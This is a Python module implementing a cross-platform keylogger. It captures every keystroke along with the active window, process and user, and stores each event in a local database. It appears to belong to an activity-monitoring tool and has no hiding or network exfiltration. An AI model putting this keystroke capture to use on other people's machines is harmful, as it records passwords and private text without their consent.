# core/keylogger.py

import sys
import threading
import time
from datetime import datetime

# Platform-specific imports
if sys.platform.startswith('win'):
    import win32gui
    import win32process
    import psutil
    from pynput import keyboard
elif sys.platform.startswith('darwin'):
    from AppKit import NSWorkspace
    from pynput import keyboard
elif sys.platform.startswith('linux'):
    import subprocess
    from pynput import keyboard

from core.app_tracker import get_active_window_info
from database.db_manager import DBManager
import os

class KeyLogger:
    def __init__(self, callback=None):
        self.log = []
        self.callback = callback  # Function to call with each keystroke event

    def on_press(self, key):
        try:
            key_str = key.char if hasattr(key, 'char') and key.char else str(key)
        except Exception:
            key_str = str(key)
        window_info = get_active_window_info()
        event = {
            'timestamp': datetime.utcnow().isoformat(),
            'key': key_str,
            'window': window_info['title'],
            'process': window_info['process'],
            'user': window_info.get('user', None)
        }
        self.log.append(event)
        if self.callback:
            try:
                self.callback(event)
            except Exception as e:
                # Optionally log error
                pass

    def start(self):
        listener = keyboard.Listener(on_press=self.on_press)
        listener.start()
        return listener

    def get_log(self):
        return self.log

if __name__ == "__main__":
    # Ensure data directory exists
    if not os.path.exists('data'):
        os.makedirs('data')
    db = DBManager('data/logs.db', 'your-strong-password')
    def save_event(event):
        try:
            db.insert_keystroke(event)
        except Exception as e:
            # Optionally log error
            pass
    kl = KeyLogger(callback=save_event)
    kl.start()
    try:
        while True:
            time.sleep(10)
    except KeyboardInterrupt:
        print("Keylogger stopped.") 